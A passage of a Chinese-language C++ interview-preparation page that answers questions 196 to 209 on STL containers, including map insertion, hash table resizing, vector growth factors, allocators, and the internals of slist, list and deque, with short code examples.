offsets），则进程B可以从该已知地址上获取容器。另外一个改进点的办法是，进程A先在共享内存某块确定地址上放置一个map容器，然后进程A再创建其他容器，然后给其取个名字和地址一并保存到这个map容器里。</p><p>进程B知道如何获取该保存了地址映射的map容器，然后同样再根据名字取得其他容器的地址。</p><h4 id="196、map插入方式有几种？"><a href="#196、map插入方式有几种？" class="headerlink" title="196、map插入方式有几种？"></a>196、map插入方式有几种？</h4><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token number">1</span><span class="token punctuation">)</span>  用insert函数插入pair数据，mapStudent<span class="token punctuation">.</span><span class="token function">insert</span><span class="token punctuation">(</span><span class="token generic-function"><span class="token function">pair</span><span class="token generic class-name"><span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token punctuation">,</span> string<span class="token operator">></span></span></span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">"student_one"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token number">2</span><span class="token punctuation">)</span>  用insert函数插入value_type数据mapStudent<span class="token punctuation">.</span><span class="token function">insert</span><span class="token punctuation">(</span><span class="token class-name">map</span><span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token punctuation">,</span> string<span class="token operator">></span><span class="token double-colon punctuation">::</span><span class="token function">value_type</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">"student_one"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token number">3</span><span class="token punctuation">)</span>  在insert函数中使用<span class="token function">make_pair</span><span class="token punctuation">(</span><span class="token punctuation">)</span>函数mapStudent<span class="token punctuation">.</span><span class="token function">insert</span><span class="token punctuation">(</span><span class="token function">make_pair</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">"student_one"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token number">4</span><span class="token punctuation">)</span>  用数组方式插入数据mapStudent<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"student_one"</span><span class="token punctuation">;</span> </code></pre><h4 id="197、STL中unordered-map-hash-map-和map的区别，hash-map如何解决冲突以及扩容"><a href="#197、STL中unordered-map-hash-map-和map的区别，hash-map如何解决冲突以及扩容" class="headerlink" title="197、STL中unordered_map(hash_map)和map的区别，hash_map如何解决冲突以及扩容"></a>197、STL中unordered_map(hash_map)和map的区别，hash_map如何解决冲突以及扩容</h4><p>1)  unordered_map和map类似，都是存储的key-value的值，可以通过key快速索引到value。不同的是unordered_map不会根据key的大小进行排序，</p><p>2)  存储时是根据key的hash值判断元素是否相同，即unordered_map内部元素是无序的，而map中的元素是按照二叉搜索树存储，进行中序遍历会得到有序遍历。</p><p>3)  所以使用时map的key需要定义operator&lt;。而unordered_map需要定义hash_value函数并且重载operator==。但是很多系统内置的数据类型都自带这些，</p><p>4)  那么如果是自定义类型，那么就需要自己重载operator&lt;或者hash_value()了。</p><p>5)  如果需要内部元素自动排序，使用map，不需要排序使用unordered_map</p><p>6)  unordered_map的底层实现是hash_table;</p><p>7)  hash_map底层使用的是hash_table，而hash_table使用的开链法进行冲突避免，所有hash_map采用开链法进行冲突解决。</p><p>8)  <strong>什么时候扩容：</strong>当向容器添加元素的时候，会判断当前容器的元素个数，如果大于等于阈值—-即当前数组的长度乘以加载因子的值的时候，就要自动扩容啦。</p><p>9)  <strong>扩容(resize)</strong>就是重新计算容量，向HashMap对象里不停的添加元素，而HashMap对象内部的数组无法装载更多的元素时，对象就需要扩大数组的长度，以便能装入更多的元素。</p><h4 id="198、vector越界访问下标，map越界访问下标？vector删除元素时会不会释放空间？"><a href="#198、vector越界访问下标，map越界访问下标？vector删除元素时会不会释放空间？" class="headerlink" title="198、vector越界访问下标，map越界访问下标？vector删除元素时会不会释放空间？"></a>198、vector越界访问下标，map越界访问下标？vector删除元素时会不会释放空间？</h4><p>1)  通过下标访问vector中的元素时不会做边界检查，即便下标越界。</p><p>也就是说，下标与first迭代器相加的结果超过了finish迭代器的位置，程序也不会报错，而是返回这个地址中存储的值。</p><p>如果想在访问vector中的元素时首先进行边界检查，可以使用vector中的at函数。通过使用at函数不但可以通过下标访问vector中的元素，而且在at函数内部会对下标进行边界检查。</p><p>2)  map的下标运算符[]的作用是：将key作为下标去执行查找，并返回相应的值；如果不存在这个key，就将一个具有该key和value的某人值插入这个map。</p><p>3)  erase()函数，只能删除内容，不能改变容量大小; </p><p>erase成员函数，它删除了itVect迭代器指向的元素，并且返回要被删除的itVect之后的迭代器，迭代器相当于一个智能指针;clear()函数，只能清空内容，不能改变容量大小;如果要想在删除内容的同时释放内存，那么你可以选择deque容器。</p><h4 id="199、map中-与find的区别？"><a href="#199、map中-与find的区别？" class="headerlink" title="199、map中[]与find的区别？"></a>199、map中[]与find的区别？</h4><p>1) map的下标运算符[]的作用是：将关键码作为下标去执行查找，并返回对应的值；如果不存在这个关键码，就将一个具有该关键码和值类型的默认值的项插入这个map。</p><p>2) map的find函数：用关键码执行查找，找到了返回该位置的迭代器；如果不存在这个关键码，就返回尾迭代器。</p><h4 id="200、-STL中list与queue之间的区别"><a href="#200、-STL中list与queue之间的区别" class="headerlink" title="200、 STL中list与queue之间的区别"></a>200、 STL中list与queue之间的区别</h4><p>1) list不再能够像vector一样以普通指针作为迭代器，因为其节点不保证在存储空间中连续存在；</p><p>2) list插入操作和结合才做都不会造成原有的list迭代器失效;</p><p>3) list不仅是一个双向链表，而且还是一个环状双向链表，所以它只需要一个指针；</p><p>4) list不像vector那样有可能在空间不足时做重新配置、数据移动的操作，所以插入前的所有迭代器在插入操作之后都仍然有效；</p><p>5) deque是一种双向开口的连续线性空间，所谓双向开口，意思是可以在头尾两端分别做元素的插入和删除操作；可以在头尾两端分别做元素的插入和删除操作；</p><p>6) deque和vector最大的差异，一在于deque允许常数时间内对起头端进行元素的插入或移除操作，二在于deque没有所谓容量概念，因为它是动态地以分段连续空间组合而成，随时可以增加一段新的空间并链接起来，deque没有所谓的空间保留功能。</p><h4 id="201、STL中的allocator-deallocator"><a href="#201、STL中的allocator-deallocator" class="headerlink" title="201、STL中的allocator,deallocator"></a>201、STL中的allocator,deallocator</h4><p>1) 第一级配置器直接使用malloc()、free()和relloc()，第二级配置器视情况采用不同的策略：当配置区块超过128bytes时，视之为足够大，便调用第一级配置器；当配置器区块小于128bytes时，为了降低额外负担，使用复杂的内存池整理方式，而不再用一级配置器；</p><p>2) 第二级配置器主动将任何小额区块的内存需求量上调至8的倍数，并维护16个free-list，各自管理大小为8~128bytes的小额区块；</p><p>3) 空间配置函数allocate()，首先判断区块大小，大于128就直接调用第一级配置器，小于128时就检查对应的free-list。如果free-list之内有可用区块，就直接拿来用，如果没有可用区块，就将区块大小调整至8的倍数，然后调用refill()，为free-list重新分配空间；</p><p>4) 空间释放函数deallocate()，该函数首先判断区块大小，大于128bytes时，直接调用一级配置器，小于128bytes就找到对应的free-list然后释放内存。</p><h4 id="202、STL中hash-map扩容发生什么？"><a href="#202、STL中hash-map扩容发生什么？" class="headerlink" title="202、STL中hash_map扩容发生什么？"></a>202、STL中hash_map扩容发生什么？</h4><p>1)   hash table表格内的元素称为桶（bucket),而由桶所链接的元素称为节点（node),其中存入桶元素的容器为stl本身很重要的一种序列式容器——vector容器。之所以选择vector为存放桶元素的基础容器，主要是因为vector容器本身具有动态扩容能力，无需人工干预。</p><p>2)   向前操作：首先尝试从目前所指的节点出发，前进一个位置（节点），由于节点被安置于list内，所以利用节点的next指针即可轻易完成前进操作，如果目前正巧是list的尾端，就跳至下一个bucket身上，那正是指向下一个list的头部节点。</p><h4 id="203、常见容器性质总结？"><a href="#203、常见容器性质总结？" class="headerlink" title="203、常见容器性质总结？"></a>203、常见容器性质总结？</h4><p>1.vector    底层数据结构为数组 ，支持快速随机访问</p><p>2.list       底层数据结构为双向链表，支持快速增删</p><p>3.deque    底层数据结构为一个中央控制器和多个缓冲区，详细见STL源码剖析P146，支持首尾（中间不能）快速增删，也支持随机访问</p><p>deque是一个双端队列(double-ended queue)，也是在堆中保存内容的.它的保存形式如下:</p><p>[堆1] —&gt; [堆2] —&gt;[堆3] —&gt; …</p><p>每个堆保存好几个元素,然后堆和堆之间有指针指向,看起来像是list和vector的结合品.</p><p>4.stack    底层一般用list或deque实现，封闭头部即可，不用vector的原因应该是容量大小有限制，扩容耗时</p><p>5.queue   底层一般用list或deque实现，封闭头部即可，不用vector的原因应该是容量大小有限制，扩容耗时（stack和queue其实是适配器,而不叫容器，因为是对容器的再封装）</p><p>6.priority_queue   的底层数据结构一般为vector为底层容器，堆heap为处理规则来管理底层容器实现</p><p>7.set          底层数据结构为红黑树，有序，不重复</p><p>8.multiset      底层数据结构为红黑树，有序，可重复 </p><p>9.map         底层数据结构为红黑树，有序，不重复</p><p>10.multimap  底层数据结构为红黑树，有序，可重复</p><p>11.unordered_set   底层数据结构为hash表，无序，不重复</p><p>12.unordered_multiset 底层数据结构为hash表，无序，可重复 </p><p>13.unordered_map   底层数据结构为hash表，无序，不重复</p><p>14.unordered_multimap 底层数据结构为hash表，无序，可重复 </p><h4 id="204、vector的增加删除都是怎么做的？为什么是1-5或者是2倍？"><a href="#204、vector的增加删除都是怎么做的？为什么是1-5或者是2倍？" class="headerlink" title="204、vector的增加删除都是怎么做的？为什么是1.5或者是2倍？"></a>204、vector的增加删除都是怎么做的？为什么是1.5或者是2倍？</h4><p>1)  新增元素：vector通过一个连续的数组存放元素，如果集合已满，在新增数据的时候，就要分配一块更大的内存，将原来的数据复制过来，释放之前的内存，在插入新增的元素；</p><p>2)  对vector的任何操作，一旦引起空间重新配置，指向原vector的所有迭代器就都失效了 ；</p><p>3)  初始时刻vector的capacity为0，塞入第一个元素后capacity增加为1；</p><p>4)  不同的编译器实现的扩容方式不一样，VS2015中以1.5倍扩容，GCC以2倍扩容。</p><p>对比可以发现采用采用成倍方式扩容，可以保证常数的时间复杂度，而增加指定大小的容量只能达到O(n)的时间复杂度，因此，使用成倍的方式扩容。</p><p>1)  考虑可能产生的堆空间浪费，成倍增长倍数不能太大，使用较为广泛的扩容方式有两种，以2二倍的方式扩容，或者以1.5倍的方式扩容。</p><p>2)  以2倍的方式扩容，导致下一次申请的内存必然大于之前分配内存的总和，导致之前分配的内存不能再被使用，所以最好倍增长因子设置为(1,2)之间： </p><p>3)  向量容器vector的成员函数pop_back()可以删除最后一个元素.</p><p>4)  而函数erase()可以删除由一个iterator指出的元素，也可以删除一个指定范围的元素。</p><p>5)  还可以采用通用算法remove()来删除vector容器中的元素.</p><p>6)  不同的是：采用remove一般情况下不会改变容器的大小，而pop_back()与erase()等成员函数会改变容器的大小。</p><h4 id="205、说一下STL每种容器对应的迭代器"><a href="#205、说一下STL每种容器对应的迭代器" class="headerlink" title="205、说一下STL每种容器对应的迭代器"></a>205、说一下STL每种容器对应的迭代器</h4><div class="table-container"><table><thead><tr><th>容器</th><th>迭代器</th></tr></thead><tbody><tr><td>vector、deque</td><td>随机访问迭代器</td></tr><tr><td>stack、queue、priority_queue</td><td>无</td></tr><tr><td>list、(multi)set/map</td><td>双向迭代器</td></tr><tr><td>unordered_(multi)set/map、forward_list</td><td>前向迭代器</td></tr></tbody></table></div><h4 id="206、STL中vector的实现"><a href="#206、STL中vector的实现" class="headerlink" title="206、STL中vector的实现"></a>206、STL中vector的实现</h4><p>vector是一种序列式容器，其数据安排以及操作方式与array非常类似，两者的唯一差别就是对于空间运用的灵活性，众所周知，array占用的是静态空间，一旦配置了就不可以改变大小，如果遇到空间不足的情况还要自行创建更大的空间，并手动将数据拷贝到新的空间中，再把原来的空间释放。vector则使用灵活的动态空间配置，维护一块<strong>连续的线性空间</strong>，在空间不足时，可以自动扩展空间容纳新元素，做到按需供给。其在扩充空间的过程中仍然需要经历：<strong>重新配置空间，移动数据，释放原空间</strong>等操作。这里需要说明一下动态扩容的规则：以原大小的两倍配置另外一块较大的空间（或者旧长度+新增元素的个数），源码：</p><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">const</span> size_type len  <span class="token operator">=</span> old_size <span class="token operator">+</span> <span class="token function">max</span><span class="token punctuation">(</span>old_size<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p> Vector扩容倍数与平台有关，在Win +  VS 下是 1.5倍，在 Linux + GCC 下是 2 倍 </p><p>测试代码：</p><pre class="language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;iostream></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;vector></span></span>using namespace std<span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token comment">//在Linux + GCC下</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> <span class="token function">res</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>cout <span class="token operator">&lt;&lt;</span> res<span class="token punctuation">.</span><span class="token function">capacity</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span>endl<span class="token punctuation">;</span> <span class="token comment">//2</span>res<span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>cout <span class="token operator">&lt;&lt;</span> res<span class="token punctuation">.</span><span class="token function">capacity</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span>endl<span class="token punctuation">;</span><span class="token comment">//4</span>res<span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>res<span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    cout <span class="token operator">&lt;&lt;</span> res<span class="token punctuation">.</span><span class="token function">capacity</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span>endl<span class="token punctuation">;</span><span class="token comment">//8</span><span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>            <span class="token comment">//在 win 10 + VS2019下</span>    vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> <span class="token function">res</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>cout <span class="token operator">&lt;&lt;</span> res<span class="token punctuation">.</span><span class="token function">capacity</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span>endl<span class="token punctuation">;</span> <span class="token comment">//2</span>res<span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>cout <span class="token operator">&lt;&lt;</span> res<span class="token punctuation">.</span><span class="token function">capacity</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span>endl<span class="token punctuation">;</span><span class="token comment">//3</span>res<span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>res<span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    cout <span class="token operator">&lt;&lt;</span> res<span class="token punctuation">.</span><span class="token function">capacity</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span>endl<span class="token punctuation">;</span><span class="token comment">//6</span>        <span class="token punctuation">&#125;</span></code></pre><p>运行上述代码，一开始配置了一块长度为2的空间，接下来插入一个数据，长度变为原来的两倍，为4，此时已占用的长度为3，再继续两个数据，此时长度变为8，可以清晰的看到空间的变化过程</p><p>需要注意的是，频繁对vector调用push_back()对性能是有影响的，这是因为每插入一个元素，如果空间够用的话还能直接插入，若空间不够用，则需要重新配置空间，移动数据，释放原空间等操作，对程序性能会造成一定的影响</p><blockquote><p>《STL源码剖析》 侯捷 P115-128</p></blockquote><h4 id="207、STL中slist的实现"><a href="#207、STL中slist的实现" class="headerlink" title="207、STL中slist的实现"></a>207、STL中slist的实现</h4><p>list是双向链表，而slist（single linked list）是单向链表，它们的主要区别在于：前者的迭代器是双向的Bidirectional iterator，后者的迭代器属于单向的Forward iterator。虽然slist的很多功能不如list灵活，但是其所耗用的空间更小，操作更快。</p><p>根据STL的习惯，插入操作会将新元素插入到指定位置之前，而非之后，然而slist是不能回头的，只能往后走，因此在slist的其他位置插入或者移除元素是十分不明智的，但是在slist开头却是可取的，slist特别提供了insert_after()和erase_after供灵活应用。考虑到效率问题，slist只提供push_front()操作，元素插入到slist后，存储的次序和输入的次序是相反的</p><p>slist的单向迭代器如下图所示：</p><p><img src="https://cdn.jsdelivr.net/gh/forthespada/mediaImage1@1.6.3.8/202102/1566227016872.png" alt=""></p><p>slist默认采用alloc空间配置器配置节点的空间，其数据结构主要代码如下</p><pre class="language-c" data-language="c"><code class="language-c">template <span class="token operator">&lt;</span>class T<span class="token punctuation">,</span> class Allco <span class="token operator">=</span> alloc<span class="token operator">></span>class slist<span class="token punctuation">&#123;</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>private<span class="token operator">:</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>    <span class="token keyword">static</span> list_node<span class="token operator">*</span> <span class="token function">create_node</span><span class="token punctuation">(</span><span class="token keyword">const</span> value_type<span class="token operator">&amp;</span> x<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token comment">//配置空间、构造元素</span>    <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">destroy_node</span><span class="token punctuation">(</span>list_node<span class="token operator">*</span> node<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token comment">//析构函数、释放空间</span>private<span class="token operator">:</span>    list_node_base head<span class="token punctuation">;</span> <span class="token comment">//头部</span>public<span class="token operator">:</span>    iterator <span class="token function">begin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>    iterator <span class="token function">end</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>    size_type <span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>    bool <span class="token function">empty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>    <span class="token keyword">void</span> <span class="token function">swap</span><span class="token punctuation">(</span>slist<span class="token operator">&amp;</span> L<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token comment">//交换两个slist，只需要换head即可</span>    reference <span class="token function">front</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span> <span class="token comment">//取头部元素</span>    <span class="token keyword">void</span> <span class="token function">push_front</span><span class="token punctuation">(</span><span class="token keyword">const</span> value<span class="token operator">&amp;</span> x<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token comment">//头部插入元素</span>    <span class="token keyword">void</span> <span class="token function">pop_front</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token comment">//从头部取走元素</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">&#125;</span></code></pre><p>举个例子：</p><pre class="language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;forward_list></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;algorithm></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;iostream></span></span>using namespace std<span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>forward_list<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> fl<span class="token punctuation">;</span>fl<span class="token punctuation">.</span><span class="token function">push_front</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>fl<span class="token punctuation">.</span><span class="token function">push_front</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>fl<span class="token punctuation">.</span><span class="token function">push_front</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>fl<span class="token punctuation">.</span><span class="token function">push_front</span><span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">;</span>fl<span class="token punctuation">.</span><span class="token function">push_front</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">;</span>forward_list<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span><span class="token operator">::</span>iterator ite1 <span class="token operator">=</span> fl<span class="token punctuation">.</span><span class="token function">begin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>forward_list<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span><span class="token operator">::</span>iterator ite2 <span class="token operator">=</span> fl<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token punctuation">;</span>ite1 <span class="token operator">!=</span> ite2<span class="token punctuation">;</span> <span class="token operator">++</span>ite1<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>cout <span class="token operator">&lt;&lt;</span> <span class="token operator">*</span>ite1 <span class="token operator">&lt;&lt;</span><span class="token string">" "</span><span class="token punctuation">;</span> <span class="token comment">// 5 6 2 3 1</span><span class="token punctuation">&#125;</span>cout <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>ite1 <span class="token operator">=</span> <span class="token function">find</span><span class="token punctuation">(</span>fl<span class="token punctuation">.</span><span class="token function">begin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> fl<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//寻找2的位置</span><span class="token keyword">if</span> <span class="token punctuation">(</span>ite1 <span class="token operator">!=</span> ite2<span class="token punctuation">)</span>fl<span class="token punctuation">.</span><span class="token function">insert_after</span><span class="token punctuation">(</span>ite1<span class="token punctuation">,</span> <span class="token number">99</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">auto</span> it <span class="token operator">:</span> fl<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>cout <span class="token operator">&lt;&lt;</span> it <span class="token operator">&lt;&lt;</span> <span class="token string">" "</span><span class="token punctuation">;</span>  <span class="token comment">//5 6 2 99 3 1</span><span class="token punctuation">&#125;</span>cout <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>ite1 <span class="token operator">=</span> <span class="token function">find</span><span class="token punctuation">(</span>fl<span class="token punctuation">.</span><span class="token function">begin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> fl<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//寻找6的位置</span><span class="token keyword">if</span> <span class="token punctuation">(</span>ite1 <span class="token operator">!=</span> ite2<span class="token punctuation">)</span>fl<span class="token punctuation">.</span><span class="token function">erase_after</span><span class="token punctuation">(</span>ite1<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">auto</span> it <span class="token operator">:</span> fl<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>cout <span class="token operator">&lt;&lt;</span> it <span class="token operator">&lt;&lt;</span> <span class="token string">" "</span><span class="token punctuation">;</span>  <span class="token comment">//5 6 99 3 1</span><span class="token punctuation">&#125;</span>cout <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p>需要注意的是c标准委员会没有采用slist的名称，forward_list在c 11中出现，它与slist的区别是没有size()方法。</p><blockquote><p>《STL源码剖析》 侯捷</p></blockquote><h4 id="208、STL中list的实现"><a href="#208、STL中list的实现" class="headerlink" title="208、STL中list的实现"></a>208、STL中list的实现</h4><p>相比于vector的连续线型空间，list显得复杂许多，但是它的好处在于插入或删除都只作用于一个元素空间，因此list对空间的运用是十分精准的，对任何位置元素的插入和删除都是常数时间。list不能保证节点在存储空间中连续存储，也拥有迭代器，迭代器的“++”、“—”操作对于的是指针的操作，list提供的迭代器类型是双向迭代器：Bidirectional iterators。</p><p>list节点的结构见如下源码：</p><pre class="language-c" data-language="c"><code class="language-c">template <span class="token operator">&lt;</span>class T<span class="token operator">></span><span class="token keyword">struct</span> <span class="token class-name">__list_node</span><span class="token punctuation">&#123;</span>    <span class="token keyword">typedef</span> <span class="token keyword">void</span><span class="token operator">*</span> void_pointer<span class="token punctuation">;</span>    void_pointer prev<span class="token punctuation">;</span>    void_pointer next<span class="token punctuation">;</span>    T data<span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p>从源码可看出list显然是一个双向链表。list与vector的另一个区别是，在插入和接合操作之后，都不会造成原迭代器失效，而vector可能因为空间重新配置导致迭代器失效。</p><p>此外list也是一个环形链表，因此只要一个指针便能完整表现整个链表。list中node节点指针始终指向尾端的一个空白节点，因此是一种“前闭后开”的区间结构</p><p>list的空间管理默认采用alloc作为空间配置器，为了方便的以节点大小为配置单位，还定义一个list_node_allocator函数可一次性配置多个节点空间</p><p>由于list的双向特性，其支持在头部（front)和尾部（back)两个方向进行push和pop操作，当然还支持erase，splice，sort，merge，reverse，sort等操作，这里不再详细阐述。</p><blockquote><p>《STL源码剖析》 侯捷 P128-142</p></blockquote><h4 id="209、STL中的deque的实现"><a href="#209、STL中的deque的实现" class="headerlink" title="209、STL中的deque的实现"></a>209、STL中的deque的实现</h4><p>vector是单向开口（尾部）的连续线性空间，deque则是一种双向开口的连续线性空间，虽然vector也可以在头尾进行元素操作，但是其头部操作的效率十分低下（主要是涉及到整体的移动）</p><p><img src="https://cdn.jsdelivr.net/gh/forthespada/mediaImage1@1.6.3.8/202102/1565876257552.png" alt=""></p><p>deque和vector的最大差异一个是deque运行在常数时间内对头端进行元素操作，二是deque没有容量的概念，它是动态地以分段连续空间组合而成，可以随时增加一段新的空间并链接起来</p><p>deque虽然也提供随机访问的迭代器，但是其迭代器并不是普通的指针，其复杂程度比vector高很多，因此除非必要，否则一般使用vector而非deque。如果需要对deque排序，可以先将deque中的元素复制到vector中，利用sort对vector排序，再将结果复制回deque</p><p>deque由一段一段的定量连续空间组成，一旦需要增加新的空间，只要配置一段定量连续空间拼接在头部或尾部即可，因此deque的最大任务是如何维护这个整体的连续性</p><p>deque的数据结构如下：</p><pre class="language-c" data-language="c"><code class="language-c">class deque<span class="token punctuation">&#123;</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>protected<span class="token operator">:</span>    <span class="token keyword">typedef</span> pointer<span class="token operator">*</span> map_pointer<span class="token punctuation">;</span><span class="token comment">//指向map指针的指针</span>    map_pointer map<span class="token punctuation">;</span><span class="token comment">//指向map</span>    size_type map_size<span class="token punctuation">;</span><span class="token comment">//map的大小</span>public<span class="token operator">:</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>    iterator <span class="token function">begin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    itertator <span class="token function">end</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">&#125;</span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/forthespada/mediaImage1@1.6.3.8/202102/1565876324016.png" alt=""></p><p>deque内部有一个指针指向map，map是一小块连续空间，其中的每个元素称为一个节点，node，每个node都是一个指针，指向另一段较大的连续空间，称为缓冲区，这里就是deque中实际存放数据的区域，默认大小512bytes。整体结构如上图所示。</p><p>deque的迭代器数据结构如下：</p><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">struct</span> <span class="token class-name">__deque_iterator</span><span class="token punctuation">&#123;</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>    T<span class="token operator">*</span> cur<span class="token punctuation">;</span><span class="token comment">//迭代器所指缓冲区当前的元素</span>    T<span class="token operator">*</span> first<span class="token punctuation">;</span><span class="token comment">//迭代器所指缓冲区第一个元素</span>    T<span class="token operator">*</span> last<span class="token punctuation">;</span><span class="token comment">//迭代器所指缓冲区最后一个元素</span>    map_pointer node<span class="token 